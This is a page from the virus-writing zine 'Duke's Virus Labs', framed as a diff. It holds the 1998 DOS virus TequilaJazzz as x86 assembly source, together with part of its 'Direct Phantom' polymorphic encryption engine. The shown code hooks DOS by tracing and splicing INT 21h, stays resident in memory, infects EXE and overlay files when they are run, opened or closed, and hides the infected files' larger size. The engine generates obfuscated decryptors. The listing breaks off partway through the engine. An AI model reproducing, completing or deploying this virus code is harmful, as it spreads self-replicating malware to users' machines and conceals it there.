@@ -1,0 +1,3210 @@
+- [Duke's Virus Labs #10] - [Page 12] -
+
+TequilaJazzz
+(c) by DaemonSerj
+
+
+Вирус, использующий все прелести технологий UEP и DPH.
+
+===== begin teqjazzz.asm =====
+TeqJazDemo	equ	'TJiw'
+TeqJazInfo	equ	'TInf'
+TequilaJiD	equ	'TeqJ'
+AnswerID	equ	'JaZz'
+MCBSign 	equ	0
+OwnerAddress	equ	1
+LenOfBLOK	equ	3
+TrF		equ	1
+GARBLELen	equ	5
+MinPRCLen	equ	130
+;─────────────────────────────
+
+
+		.486
+		.model	small
+TeqJazzz	segment para public use16 'code'
+		assume	cs:TeqJazzz,ds:TeqJazzz
+
+TequilaJazzz	proc
+
+		call	TequilaBase
+TequilaBase:	mov	bp,sp
+		mov	al,[bp]
+		mov	ah,[bp+1]
+		sub	ax,offset TequilaJazzz+3
+		inc	sp
+		inc	sp
+		mov	si,ax
+		mov	word ptr cs:[si+TeqBASE],ax
+		sti
+				       ; Тест процессора
+		pushf		       ; i286  : 15 бит FLAGS = 1
+		pop	ax	       ; i386+ : 15 бит EFLAGS = 0
+		or	ah,10000000b
+		push	ax
+		popf
+		pushf
+		pop	ax
+		test	ah,10000000b
+		jz	Its386&Higher  ; Ниже тройки не пойдет
+
+		mov	al,90h			     ; NOP вместо 66h
+		mov	byte ptr cs:[si+PopAll],al
+		mov	byte ptr cs:[si+PopFlag],al
+		jmp	ExitTequilaJaz
+
+Its386&Higher:
+		pop	es
+		pop	ds
+		popa
+		popf
+		pushfd
+		pushad	       ; Сохраним все 32 разрядные регистры
+		push	ds
+		push	es
+
+		mov	si,0000h
+TeqBASE 	equ	$ - 2
+
+		mov	ax,0FF55h	  ; Присутствуем в памяти ?
+		mov	edx,TequilaJiD
+		push	cs
+		pop	ds
+		mov	bx,offset Generation   ; Ссылка на поколение
+		int	21h
+		cmp	edx,AnswerID
+		je	ExitTequilaJaz
+
+		mov	dx,ParaLenWSP+1 ; Освободим себе места
+		call	ReAllocateMEM
+
+		mov	ah,48h		; Выделяем себе блок
+		mov	bx,dx
+		dec	bx
+		int	21h
+		jc	ExitTequilaJaz
+
+		mov	es,ax
+		dec	ax
+		mov	ds,ax
+		mov	word ptr ds:[OwnerAddress],8h	; Я круче DOS !
+
+		push	cs	       ; Переезжаем...
+		pop	ds
+		mov	cx,[si+LenPreparePart]	; Сам вирус и
+		add	cx,TequilaLen		; часть затертой процедуры
+		cld
+		xor	di,di
+		rep	movsb	     ; Все свое ношу с собой
+
+		push	es
+		push	offset Continue
+		retf
+Continue:
+		push	cs
+		pop	ds
+
+; Перехватим Int 21h : Извращаться особо не будем
+; Протрассируем Int 21h - через Int 1 получим оригинальный Int 21h
+
+		xor	ax,ax
+		mov	es,ax
+
+		mov	eax,es:[21h*4]	     ; Табличный Int 21h
+		mov	[RealInt21],eax
+		mov	[Work],offset TestDOS
+
+		mov	ah,2Ch
+		call	TraceDOS	 ; А мы тут плюшками балуемся ...
+
+; Делаем сплайсинг в DOS
+; стандартным JMP'ом в вирус
+
+		mov	[Work],offset RestoreJump
+
+		mov	byte ptr [DOSbytes],0EAh
+		mov	word ptr [OldDOSbytes],offset TeqJazInt21
+		mov	word ptr [OldDOSbytes + 2],cs
+		call	ExchangeDOS
+
+; Переустановим адрес родительского процесса в PSP на себя
+; для последующего переезда вниз
+
+		mov	ah,62h
+		call	DOS
+
+		mov	es,bx
+		mov	di,0Ah
+		mov	eax,es:[di]
+		mov	[ParentAddress],eax   ; Parental Address
+		mov	ax,cs
+		shl	eax,10h
+		mov	ax,offset MoveToLowMEM
+		cld
+		stosd
+
+		xor	si,si
+
+ExitTequilaJaz:
+
+		les	di,[si+ProcAddress]  ; Адрес зараженной процедуры
+		mov	ah,62h
+		int	21h
+		add	bx,10h
+
+		mov	ax,es
+		add	ax,bx
+		mov	es,ax
+
+		push	cs
+		pop	ds
+
+		mov	word ptr [si+ReturnToPROC],di	  ; Для выхода
+		mov	word ptr [si+ReturnToPROC+2],es
+
+		mov	bx,si
+		mov	cx,[si+LenPreparePart]
+		add	si,TequilaLen
+					  ; Восстанавливаем процедуру
+		rep	movsb
+
+; Восстановим выход из процедуры
+; Процедура была полностью замаскирована : затерт и выход и вход
+
+		mov	di,[bx+ExitPROC]
+		mov	ax,[bx+OldBytes]   ; Байты выхода из процедуры -
+		mov	es:[di],ax	   ; POP BP,RETF/RETN
+
+		jmp	$+2	; Пошлем их со своим конвейером...
+
+		pop	es     ; Восстанавливаем Все регистры
+		pop	ds
+PopAll: 	popad
+PopFlag:	popfd
+		db	0EAh   ; Jmp far PROC
+ReturnToPROC	dd	0
+TequilaJazzz	endp
+;───────────────────
+MoveToLowMEM	proc
+		push	ax
+		mov	ah,48h		; Делаем новый внизу
+		mov	bx,ParaLenWSP
+		call	DOS
+		jc	GotoParent	; Обломаемся мы с переездом...
+
+		mov	es,ax
+		dec	ax
+		mov	ds,ax
+		mov	word ptr ds:[OwnerAddress],8 ; Владелец блока DOS.
+
+		push	cs
+		pop	ds
+
+		xor	si,si		 ; Снова на новую квартиру
+		xor	di,di
+		cld
+		mov	cx,TequilaLen
+		rep	movsb
+
+		lds	si,[RealInt21]
+		cmp	word ptr [si+1],offset TeqJazInt21
+		jne	JmpIsHeRe
+
+		call	ExchangeDOS	 ; Новый сегмент обработчика
+JmpIsHeRe:
+		mov	word ptr cs:[OldDOSbytes + 2],es
+		call	ExchangeDOS
+
+		mov	ax,cs	    ; Освобождаем этот блок
+		mov	es,ax
+		mov	ah,49h
+		call	DOS
+GotoParent:
+		pop	ax
+		db	0EAh
+ParentAddress	dd	0
+MoveToLowMEM	endp
+;──────────────────────────
+TeqJazInt21	proc
+; Проверка на трассировку
+
+		pushf
+
+		jmp	ExitTeqInt21	; Отвали козел...
+
+		push	ax
+		push	ss		; Это если в трассировщике использован
+		db	2Eh,3Eh,26h,36h ; такой же прием как и у нас
+		pop	ss		; (сбрасывание TF при pushf)
+
+		pushf
+		pop	ax
+		test	ah,1		; TF is ON!
+		pop	ax
+
+		jnz	ExitTeqInt21	; Отвали козел...
+
+;────────────────────────────────────────
+; Это мы тут настырно лезем ?
+		cmp	ax,0FF55h
+		jne	Farther 	; Дальше...
+
+		cmp	edx,TequilaJiD	; Идентификация ?
+		jne	TeqIdentify
+
+		mov	edx,ds:[bx+si]	     ; SI - база
+		cmp	edx,cs:[Generation]  ; BX - смещение Generation с SI=0
+		jb	OldVersion
+		mov	cs:[Generation],edx  ; Обновляем поколение
+OldVersion:
+		mov	edx,AnswerID	     ; Ответ
+		popf
+		iret
+;───────────────────────────────────
+TeqIdentify:
+		cmp	edx,TeqJazInfo	 ; Выдача информации ?
+		jne	OtherTJ
+
+		push	ax
+		push	dx
+		push	ds
+
+		mov	ax,3
+		int	10h
+
+		push	cs
+		pop	ds
+		mov	dx,offset TequilaInfo
+
+		mov	ah,9h
+		call	DOS
+		pop	ds
+		pop	dx
+		pop	ax
+		popf
+ExitOurFunc:	iret
+;────────────────────────────────────────
+OtherTJ:
+		cmp	edx,TeqJazDemo
+		jne	ExitTeqInt21	; Не наша функция
+
+		push	ax
+		push	dx
+		push	ds
+
+		mov	ax,13
+		int	10h
+
+		push	cs
+		pop	ds
+		call	TequilaDemo
+
+		mov	ax,3
+		int	10h
+
+		mov	dx,offset DemoInfo
+		mov	ah,9
+		call	DOS
+
+		pop	ds
+		pop	dx
+		pop	ax
+		popf
+		iret
+;─────────────────────────────────────────
+; Маскировка по 4Eh,4Fh
+Farther:
+		cmp	ah,4Fh
+		je	StealthNext
+		cmp	ah,4Eh
+		jne	Further 	; Дальше,дальше...
+
+StealthInfect:
+		push	di
+		push	es
+		mov	di,offset StealthPath
+		push	cs
+		pop	es
+
+		clc
+		call	CopyPath	; Скопируем путь если ищут файл
+		pop	es
+		pop	di
+StealthNext:
+		popf			; Флаги !
+		call	DOS
+		jc	FileNotFound	; Файлов не нашли
+
+		pushf
+		push	es
+		push	ds
+		pusha
+
+		mov	ah,2Fh		  ; ES:BX - DTA
+		call	DOS
+		push	es
+		pop	ds
+
+		test	byte ptr [bx+15h],00011100b
+					  ; Если ищут метку тома или каталог
+		jnz	GetOut		  ; или системный то на выход
+
+		lds	si,[bx+1Eh]	  ; Адрес имени файла
+		push	cs
+		pop	es
+		call	AddFileName	  ; Присоединим к пути найденный файл
+
+		call	TestPath	  ; EXE,OVL,OVR
+		jnz	GetOut
+
+		mov	word ptr cs:[FileName],offset StealthPath
+		mov	word ptr cs:[FileName + 2],cs
+		call	TestFile	; Проверим
+		jnz	GetOut		; ZF=1 - если файл уже заражен
+
+		mov	ax,word ptr cs:[Header+ChkSum]
+					       ; Длинна вируса в зараженном файле
+					       ; (Хранится в заголовке)
+		sub	[bx+1Ah],ax	       ; Укоротим...:)
+		sbb	word ptr [bx+1Ch],0
+GetOut:
+		popa
+		pop	ds
+		pop	es
+		popf
+FileNotFound:
+		retf	2
+;────────────────────────
+; Загрузка и выполнение
+Further:
+		cmp	ah,4Bh
+		je	FileFunction
+		cmp	ah,43h
+		je	FileFunction
+		cmp	ah,56h
+		jne	HandlesFunc
+FileFunction:
+		call	TestPath
+		jc	DontFuckFile
+
+		mov	word ptr cs:[FileName],dx
+		mov	word ptr cs:[FileName + 2],ds
+		call	MainInfect
+DontFuckFile:
+		jmp	ExitTeqInt21
+;───────────────────────────────────
+; Функции получения Handle
+HandlesFunc:
+		cmp	ah,3Ch
+		je	CreateOpen
+		cmp	ah,5Bh
+		je	CreateOpen
+		cmp	ah,3Dh
+		jne	Close
+CreateOpen:
+		cmp	word ptr cs:[InfHandle],0
+		jnz	ExitTeqInt21
+
+		popf
+		call	DOS
+		jc	OpenFailure
+		pushf
+
+		call	TestPath	   ; Посмотрим путь
+		jc	DontRemember	   ; Не запоминать Handle
+
+		clc			   ; Скопируем путь
+		call	CopyPath
+		mov	word ptr cs:[InfHandle],ax
+
+DontRemember:	pop	di
+		pop	es
+		popf
+OpenFailure:	retf	2
+;────────────────────────
+Close:
+		cmp	ah,3Eh		  ; Просили что то другое ...
+		jne	ExitTeqInt21
+
+		push	ax		  ; Закрывают тот что открывали ?
+		mov	ax,0000h
+InfHandle	equ	$ - 2
+		cmp	bx,ax
+		pop	ax
+		jne	ExitTeqInt21
+
+		popf			  ; Закроем
+		call	DOS
+		jc	FPBCorrupted	  ; НЕ закрылся
+
+		mov	word ptr cs:[FileName],offset TeqFilePath
+		mov	word ptr cs:[FileName + 2],cs
+		call	MainInfect
+		mov	word ptr cs:[InfHandle],0
+FPBCorrupted:
+		retf	2
+;────────────────────────
+ExitTeqInt21:
+		popf
+		call	DOS
+		retf	2
+TeqJazInt21	endp
+;───────────────────
+TeqJazInt1	proc
+; Трассирует Int 21 и эмулирует PUSHF/POPF
+
+		mov	word ptr cs:[KeepDS],ds
+		mov	word ptr cs:[KeepBX],bx
+		mov	word ptr cs:[KeepAX],ax
+		mov	word ptr cs:[KeepDX],dx
+
+		pop	bx	      ; DS:BX - адрес следующей команды
+		pop	ds
+		pop	cs:[Flags]
+
+		call	cs:[Work]
+
+		mov	word ptr cs:[CurCMD],bx
+TestPrefix:
+		mov	al,[bx]
+		and	al,11100111b
+		cmp	al,00100110b	    ; ES/CS/SS/DS
+		jne	TestCoMD
+		inc	bx
+		jmp	TestPrefix
+TestCoMD:
+		mov	ax,[bx]
+		cmp	al,17h	      ; Эмулим POP SS
+		jne	NotSS
+		inc	bx
+		cli
+		pop	ss
+		sti
+NotSS:
+		jmp	$+2
+		mov	al,[bx]
+		cmp	al,9Ch	      ; PUSHF
+		je	ItsPushf
+		cmp	al,9Dh	      ; POPF
+		je	ItsPopf
+
+		mov	bx,0000h
+CurCMD		equ	$ - 2
+		jmp	ExitTeqInt1
+ItsPopf:
+		inc	bx	      ; Ставим TF в POPF
+		pop	ax
+		or	ah,TrF
+		push	ax
+		jmp	GoExit1
+ItsPushf:
+		inc	bx	      ; Убираем TF в PUSHF
+		mov	dx,cs:[Flags]
+		and	dh,NOT TrF
+		push	dx
+ExitTeqInt1:
+		push	cs:[Flags]
+GoExit1:	push	ds
+		push	bx
+
+		mov	ax,0000h
+KeepDS		equ	$ - 2
+		mov	ds,ax
+		mov	bx,0000h
+KeepBX		equ	$ - 2
+		mov	ax,0000h
+KeepAX		equ	$ - 2
+		mov	dx,0000h
+KeepDX		equ	$ - 2
+		iret
+;───────────────────
+TestDOS:
+		mov	ax,ds
+		cmp	ax,0300h      ; DOS ?
+		jb	ItsDOS
+		cmp	ax,0C800h     ; Hi DOS ?
+		jb	@return
+ItsDOS:
+		mov	word ptr cs:[RealInt21],bx    ; Настоящий Int 21h
+		mov	word ptr cs:[RealInt21+2],ax
+OutInInt1:
+		push	es
+		push	0000h
+		pop	es
+		mov	dword ptr es:[1h*4],12345678h
+DOSInt1 	equ	$ - 4
+		pop	es
+		and	byte ptr cs:[Flags+1],NOT TrF	; Сбросим TF
+@return:	ret
+;──────────────────
+RestoreJump:
+		mov	al,0
+TraceCounter	equ	$ - 1
+		inc	byte ptr cs:[TraceCounter]
+		cmp	al,8
+		jb	@return
+
+		call	ExchangeDOS
+		mov	byte ptr cs:[TraceCounter],0
+TrRET:		jmp	OutInINT1
+TeqJazInt1	endp
+;───────────────────
+CopyPath	proc
+; Копирование пути
+; DS:DX - источник
+; ES:DI - приемник если CF=1
+
+		push	ax
+		push	es
+		push	di
+		push	si
+		jc	UnDefine
+
+		push	cs     ; В путь ...
+		pop	es
+		mov	di,offset TeqFilePath
+UnDefine:
+		push	dx
+		pop	si
+		push	si
+		cld
+FindZero:
+		lodsb
+		test	al,al
+		jnz	FindZero
+
+		pop	ax
+		sub	si,ax
+		cmp	si,80h
+		jnb	NotPath       ; Вместо пути подсунули какое то гавно
+
+		push	ax
+		pop	si
+
+		mov	word ptr cs:[EndDir],ax
+CopyDir:
+		lodsb
+		stosb
+		cmp	al,'\'
+		jne	$+5
+		mov	word ptr cs:[EndDir],si
+
+		cmp	al,'/'
+		jne	$+5
+		mov	word ptr cs:[EndDir],si
+
+		test	al,al
+		jnz	CopyDir
+NotPath:
+		pop	si
+		pop	di
+		pop	es
+		pop	ax
+		ret
+CopyPath	endp
+;───────────────────
+AddFileName	proc
+; Присоединение имени файла
+; DS:SI - имя файла
+; ES: - сегмент заранее !!! скопированного пути
+
+		push	di
+		push	ax
+
+		mov	di,1234h
+EndDir		equ	$ - 2
+		cld
+CopyName:
+		lodsb
+		stosb
+		test	al,al
+		jnz	CopyName
+
+		pop	ax
+		pop	di
+		ret
+AddFileName	endp
+;───────────────────
+TestPath	proc
+; DS:DX - путь с тестируемым файлом
+; ZF=0 - Незаражаемый файл
+; ZF=1 - Заражаемый файл
+
+		push	ax
+		push	si
+
+		push	dx
+		pop	si
+
+		cld
+FndZero:
+		lodsb
+		test	al,al
+		jnz	FndZero
+
+		cmp	byte ptr [si-5],'.'  ; Без расширения или с коротким
+		jne	FailurePath
+
+		mov	ax,[si-4]
+		and	ax,0DFDFh      ; приводим к верхнему регистру
+		cmp	ax,'XE'        ; EXE
+		jne	FailurePath
+		cmp	ax,'VO'        ; OVL/OVR
+FailurePath:
+		pop	si
+		pop	ax
+		ret
+TestPath	endp
+;───────────────────
+ExchangeDOS	proc
+		pushf
+		push	di
+		push	ds
+		push	eax
+
+		cli
+		lds	di,cs:[RealInt21]
+
+		mov	al,12h
+DOSbytes	equ	$ - 1
+		xchg	[di],al
+		mov	byte ptr cs:[DOSbytes],al
+
+		mov	eax,12345678h
+OldDOSbytes	equ	$ - 4
+		xchg	[di+1],eax
+		mov	dword ptr cs:[OldDOSbytes],eax
+
+		pop	eax
+		pop	ds
+		pop	di
+		popf
+		ret
+ExchangeDOS	endp
+;───────────────────
+DOS		proc
+		call	ExchangeDOS   ; Восстановим старые DOS'овские байтики
+DOS		endp
+;───────────────────
+TraceDOS	proc
+		pushf
+		push	eax
+		pushf
+		push	es
+
+		xor	ax,ax
+		mov	es,ax
+
+		cli
+		mov	ax,cs		     ; Ставим Int 1
+		shl	eax,10h
+		mov	ax,offset TeqJazInt1
+		xchg	es:[1h*4],eax
+		mov	dword ptr [DOSInt1],eax
+		sti
+
+		pop	es
+		popf
+		pushf		    ; Set Trace Flag
+		pop	ax
+		or	ah,TrF
+		push	ax
+		popf
+
+		pop	eax
+		db	9Ah	      ; К папочке...
+RealInt21	dd	0
+		ret
+TraceDOS	endp
+;─────────────────────────────────
+Include 	teqdemo.asm	   ; Includes...
+Include 	phantom.asm
+Include 	trash.asm
+Include 	uepinf.asm
+;─────────────────────────────────
+ReAllocateMEM	proc
+; Предполагается что блок уже измененяться прграммой не будет
+; ZF=1 - Удачно обрезали блок
+; ZF=0 - неудачно
+		push	ds
+
+		mov	ah,62h
+		int	21h
+
+		mov	es,bx
+		dec	bx
+		mov	ds,bx
+
+		mov	eax,TequilaJiD ; Идентификатор распределенности блока
+		mov	word ptr bx,ds:[LenOfBlOK]   ; Длинна блока
+
+		cmp	byte ptr ds:[MCBSign],'M'
+		jne	Realloc
+
+		cmp	dword ptr es:[0F0h],eax  ; Перераспределено нами ?
+		jne	DontReAlloc
+
+		cmp	word ptr es:[0F4h],bx	 ; Кто то изменял уже
+		jne	DontReAlloc		 ; после нас
+Realloc:
+		mov	dword ptr es:[0F0h],eax  ; Установим
+
+		sub	bx,dx
+		mov	ah,4Ah
+		int	21h
+
+		sub	word ptr es:[0F4h],dx	 ; Новая длинна блока
+		sub	word ptr es:[2],dx
+		xor	ax,ax
+DontReAlloc:	pop	ds
+		ret
+ReAllocateMEM	endp
+;────────────── TequilaJazzz Data Area ────────────────
+
+ProcAddress	dd	4
+FileName	dd	0
+Generation	dd	0
+
+Work		dw	0
+flags		dw	0
+handle		dw	0
+OldBytes	dw	9090h
+TeqCopyID	dw	0
+LenPreparePart	dw	0
+
+RELOFFS 	dw	0
+DEST_CODE	dw	0
+COUNTER 	dw	0
+TARGETPLACE	dd	0
+LENDECRYPTOR	dw	0
+
+TequilaInfo	db	'VirName     : TequilaJazzz',13,10
+		db	'Author      : DaemonSerJ',13,10
+		db	'Copyleft    : (C) 1998 Russia,Nsk,NSTU',13,10
+		db	'HookDOS     : Trace , Splice',13,10
+		db	'Memory      : LowMEM',13,10
+		db	'Infect      : UEP.EXE.Infecting',13,10
+		db	'Polymorph   : DirectPhantom v2.1',13,10
+		db	'AttackSpeed : Fast',13,10
+		db	'Destructive : None',13,10
+		db	13,10,'...Удачи в борьбе с вирусами...:)',13,10,'$'
+
+TequilaLen	equ	offset $
+TeqFilePath	equ	$
+StealthPath	equ	$+80h
+Header		equ	$+100h
+
+ParaLenWSP	equ	(5000+120h)/16+1
+
+TeqTempWSP	equ	5000+700h+MinPRCLen*2
+
+TeqJazzz	ends
+                end     TequilaJazzz
+===== end   teqjazzz.asm =====
+
+===== begin phantom.asm =====
+CntF		equ	00000001b   ; счетчик / предел
+RMF		equ	00000010b   ; регистр / память
+UcF		equ	00000100b   ; неизвестное место кода
+JRQ		equ	00001000b   ; Запрос на Jxx Imm8
+PRQ		equ	00010000b   ; Запрос на Push/Pop
+SRQ		equ	00100000b   ; Запрос на Subroutine
+CRQ		equ	01000000b   ; Запрос на CALL
+FCR		equ	10000000b   ; Бит завершения CALL'ов
+MSR		equ	100000000b  ; Бит запрещения SUB & CALL
+
+REG_AX		equ	0	    ; Регистры по порядку
+REG_CX		equ	1
+REG_DX		equ	2
+REG_BX		equ	3
+REG_SP		equ	4
+REG_BP		equ	5
+REG_SI		equ	6
+REG_DI		equ	7
+
+PhantomID	db	'Direct Phantom v2.1',0
+RND_SEED	db	55h
+				     ; 7		     0
+REG_USED	db	00010000b    ; DI SI BP SP BX DX CX AX
+				     ; 7		     0
+HALF_USED	db	00000000b    ; BH DH CH AH BL DL CL AL
+
+PH_FLAGS	db	0      ; флаги
+		db	0      ; Расширенные флаги
+
+BASE_REG	db	0      ; базовый регистр
+KEY_REG 	db	0      ; ключ
+BASE_RM 	db	0      ; адресация через базу в память
+BASE_TR 	dw	0      ; база - init
+EncryptPart	dw	0      ; адрес EP в стеке
+
+INITTAB 	dw	offset INITBASEOFFS   ; Таблица инициализации
+		dw	offset INITBASESEG
+		dw	offset INITKEY
+		dw	offset INITCOUNTER
+		dw	offset INITBASESEG
+INITFLAGS	db	0
+;-----------------------------------------
+ImmF		equ	10000000b
+KeyF		equ	01000000b
+
+		; COP , ModeR/M , Flags & Зеркальная команда
+
+CRYPTTAB	db	11000000b,11000000b,ImmF+3   ; ROL REG/MEM,IMM8
+		db	11000000b,11001000b,ImmF+0   ; ROR REG/MEM,IMM8
+		db	10000000b,11000000b,ImmF+9   ; ADD REG/MEM,imm8
+		db	10000000b,11101000b,ImmF+6   ; SUB REG/MEM,imm8
+		db	10000000b,11110000b,ImmF+12  ; XOR reg/mem,imm8
+
+		db	11110110b,11010000b,15	     ; NOT reg/mem
+		db	11110110b,11011000b,18	     ; NEG reg/mem
+		db	11111110b,11000000b,24	     ; INC reg/mem
+		db	11111110b,11001000b,21	     ; DEC reg/mem
+		db	11010000b,11000000b,30	     ; ROL REG/MEM,1
+		db	11010000b,11001000b,27	     ; ROR REG/MEM,1
+
+		db	00000000b,11000000b,KeyF+36  ; ADD reg/mem,KEY
+		db	00101000b,11000000b,KeyF+33  ; SUB reg/mem,KEY
+		db	00110000b,11000000b,KeyF+39  ; XOR reg/mem,KEY
+ENDCRCMD	equ	$
+
+;-----------------------------------------------------------------------------
+RND		proc
+; dl = RND(0..dl)  получить случайный байт
+
+		push	ax
+		or	dl,dl		     ; RND(0..0)=0
+		jz	FinishRND
+		push	dx
+
+		inc	dl
+		jnz	NormLimit
+		dec	dl
+NormLimit:
+		mov	ax,0100h	    ; размер единичного отрезка
+		div	dl
+		not	ah
+		push	ax
+
+		in	al,40h		 ; RND байт
+		mul	[RND_SEED]
+		add	ax,13849
+		mov	[RND_SEED],al
+
+		pop	dx	    ; Биективно отобразим RND байт в пределы
+		cmp	al,dh
+		jbe	NormByte
+		mov	al,dh
+NormByte:
+		xor	ah,ah
+		div	dl
+		pop	dx
+		mov	dl,al
+FinishRND:
+		pop	ax
+		ret
+RND		endp
+;-------------------
+DROPCOIN	proc
+; подбрасывание монетки - результат в ZF
+		push	dx
+		mov	dl,1
+		call	RND
+		and	dl,1
+		pop	dx
+		ret
+DROPCOIN	endp
+;-------------------
+GETNUM		proc
+; Exit - RND = 0...dl , al = mask
+		call	RND
+		mov	cl,dl
+		mov	al,1
+		shl	al,cl
+		ret
+GETNUM		endp
+;-------------------
+GETFREEREG	proc
+; CF=0 - регистр
+; CF=1 - полурегистр
+; Возвращает свободный регистр в DL
+		pushf
+		push	ax
+		push	cx
+		jc	HalfReg
+NextReg:
+		mov	dl,7
+		call	GETNUM
+		test	[REG_USED],al
+		jnz	NextReg
+
+		or	[REG_USED],al	 ; Пометим как занятый
+
+		mov	cl,al		 ; биты 3...0 в 7...0
+		shl	cl,4		 ; для HALF_USED
+		and	al,0Fh
+		or	al,cl
+		or	[HALF_USED],al	 ; Пометим
+
+		jmp	RegDone
+HalfReg:
+		mov	dl,7
+		call	GETNUM
+		test	[HALF_USED],al
+		jnz	HalfReg
+
+		or	[HALF_USED],al	; Пометим как занятый
+		cmp	al,0Fh
+		jb	DontRotate
+		shr	al,4		; Пометим как занятый и в REG_USED
+DontRotate:
+		or	[REG_USED],al
+RegDone:	pop	cx
+		pop	ax
+		popf
+		ret
+GETFREEREG	endp
+;-------------------
+FREEREG 	proc
+; Обьвляет регистр свободным
+		push	ax
+		pushf
+		mov	al,1
+		mov	cl,dl
+		shl	al,cl
+
+		mov	cl,al
+		not	cl
+
+		mov	ah,al		   ; биты 3...0 в 7...0
+		shl	ah,4		   ; для HALF_USED
+		and	al,0Fh
+		or	ah,al
+
+		popf
+		jc	FreeHalfReg
+
+		not	ah		   ; Освобождаем регистр и
+		and	[REG_USED],cl	   ; два соответствующих полурегистра
+		and	[HALF_USED],ah
+		jmp	EndFreeReg
+FreeHalfReg:
+		and	[HALF_USED],cl	   ; Если второй полурегистр свободен
+		and	ah,[HALF_USED]	   ; то освобождаем регистр
+		jnz	EndFreeReg
+		not	al
+		and	[REG_USED],al
+EndFreeReg:
+		pop	ax
+		ret
+FREEREG 	endp
+;-------------------
+MAKERM		proc
+; Исходя из индексного регистра в DL делает
+; соответствующую адресацию впамять
+		push	ax
+		mov	al,00011011b
+		cmp	dl,REG_BX	 ; BX
+		jz	RM
+		shr	al,2
+		cmp	dl,REG_BP	 ; BP
+		jz	RM
+		shr	al,2
+		cmp	dl,REG_DI	 ; DI
+		jz	RM
+
+		shr	al,2		 ; SI
+RM:		and	al,00000011b
+		or	al,00000100b	 ; DONE
+		mov	[BASE_RM],al
+		pop	ax
+		ret
+MAKERM		endp
+;-------------------
+SavePRFX	proc
+
+		cmp	[BASE_REG],REG_BP    ; Префикс только перед [BP]
+		jne	PRFX_OUT
+
+		push	cx
+		in	al,40h
+		mov	cl,al
+
+		mov	al,00100110b
+RNDPRFX:	xor	al,00011000b   ; ES или DS
+		loop	RNDPRFX
+
+		stosb		       ; DONE
+		pop	cx
+PRFX_OUT:
+		ret
+SavePRFX	endp
+;-------------------
+INITBASEOFFS	proc
+; базирует регистр на криптуемый код
+; возможно неизвестное смещение - код сразу за декриптором
+
+GetBase:
+		clc
+		call	GETFREEREG	  ; получили базу
+
+		mov	al,1
+		mov	cl,dl
+		shl	al,cl
+		and	al,11101000b ;маска индексных регистров : SI,DI,BP,BX
+		jnz	BASEOK
+
+		clc		     ;только индексные
+		call	FREEREG
+		jmp	GetBase
+BASEOK:
+		mov	[BASE_REG],dl	  ; запомним
+		call	MAKERM		  ; сделаем r/m байт
+
+		mov	al,10111000b	  ; mov reg,imm16
+		or	al,dl
+		stosb
+
+		mov	dx,[DEST_CODE]	; Смещение криптуемого кода
+		test	[PH_FLAGS],UcF	; еще известно - доделаем потом
+		jz	make_base	; DESTCODE будет сразу за декриптором
+
+		xor	dx,dx		; пока база 0
+		mov	word ptr [PHTEMP_BASE],di
+make_base:
+		in	al,40h	 ; Словное дополнительное TRASH смещение
+		mov	ah,al
+		in	al,40h
+
+		xchg	ax,dx	 ; INITBASE = BASE - TRASH
+		sub	ax,dx
+		mov	[BASE_TR],dx
+		stosw
+		call	TRCHAIN
+		ret
+INITBASEOFFS	endp
+;-------------------
+INITBASESEG	proc
+; Установим ES,DS = CS
+		mov	dh,00011000b	   ; ES или DS
+DEST_SREG	equ	$ - 1
+
+		mov	dl,00001000b	   ; CS
+		call	MAKESEGREG
+		xor	byte ptr [DEST_SREG],00011000b
+
+		ret
+INITBASESEG	endp
+;-------------------
+MAKESEGREG	proc
+; dh - destination sreg      Моделируется : PUHS SRC  или  MOV REG,SRC
+; dl - source sreg			    POP DEST	   MOV DEST,REG
+
+		call	DROPCOIN    ; подбросим монетку
+		jz	SECONDPART
+
+		mov	al,00000110b	  ; PUSH SREG
+		or	al,dl		  ; + SOURCE
+		stosb
+
+		call	TRCHAIN
+
+		xor	al,dl		  ; сбросим SOURCE
+		or	al,1		  ; + POP
+		or	al,dh		  ; + DESTINATION
+		stosb
+		jmp	DoneSreg
+SECONDPART:
+		mov	ax,1100000010001100B	  ; MOV REG,SREG
+		or	ah,dl
+		clc
+		mov	cl,dl
+		call	GETFREEREG
+		xchg	cl,dl
+		or	ah,cl	      ; промежуточный регистр
+		stosw
+
+; Нельзя делать CALL мусор, так как вызванная ниже процедура может
+; портить уже освобожденный здесь промежуточный регистр
+
+		or	word ptr [PH_FLAGS],MSR
+		call	TRCHAIN
+		xor	word ptr [PH_FLAGS],MSR
+
+		xor	ah,dl	      ; сбросим SOURCE
+		or	al,2	      ; Set Dbit - MOV SREG,AX
+		or	ah,dh	      ; + DESTINATION
+		or	ah,cl	      ; + промежуточный регистр
+		stosw
+
+		mov	dl,cl	      ; свободен для дальнейшего
+		clc
+		call	FREEREG
+DoneSreg:
+		call	TRCHAIN
+		ret
+MAKESEGREG	endp
+;-------------------
+INITKEY 	proc
+		in	al,40h		; ключ
+		mov	ah,al
+		mov	al,10110000b	; MOV REG,IMM8
+		stc
+		call	GETFREEREG	; сам регистр
+		mov	[KEY_REG],dl	; он нам еще будет нужен
+		or	al,dl
+		stosw
+		call	TRCHAIN
+		ret
+INITKEY 	endp
+;-------------------
+INITCOUNTER	proc
+		call	DROPCOIN	; ограничивание криптуемого кода -
+		jz	CodeLimit	; сравнивание с пределом
+
+		clc			; сделаем счетчик
+		call	GETFREEREG
+		mov	byte ptr [CNT_REG],dl
+		mov	al,10111000b
+		or	al,dl
+		stosb
+
+		mov	ax,[counter]
+		stosw
+		or	[PH_FLAGS],CntF    ; ограничивание по счетчику
+		call	TRCHAIN 	   ; DEC CNT
+CodeLimit:
+		xor	[PH_FLAGS],CntF    ; ограничивание по пределу
+		ret			   ; CMP BASE,DESTCODE+COUNTER
+INITCOUNTER	endp
+;-------------------
+INITPHANTOM	proc
+;Инициализация всех параметров в произвольном порядке
+
+		call	DROPCOIN      ;криптование REG/MEM ?
+		jz	CRYPTTYPE
+
+		or	[PH_FLAGS],RMF	  ; криптование непосредственно
+					  ; в память
+CRYPTTYPE:
+		cmp	[DEST_CODE],0FFFFh   ; DEST_CODE неизвестно
+		jne	fixed		     ; будет сразу за декриптором
+
+		or	[PH_FLAGS],UcF	     ; установим Unknown Code Flag
+fixed:
+
+; Последовательный RND вызов процедур настройки параметров
+
+		mov	dl,4
+NextProc:
+		push	dx
+		call	GETNUM
+		shl	dl,1
+		movzx	bx,dl	 ; index в таблице адресов процедур
+
+		test	[INITFLAGS],al
+		jnz	ThisProcIsDone	  ; Уже была выполнена
+
+		or	[INITFLAGS],al		  ; Пометим
+		call	[BX+offset INITTAB]	  ; Выполним
+		pop	dx
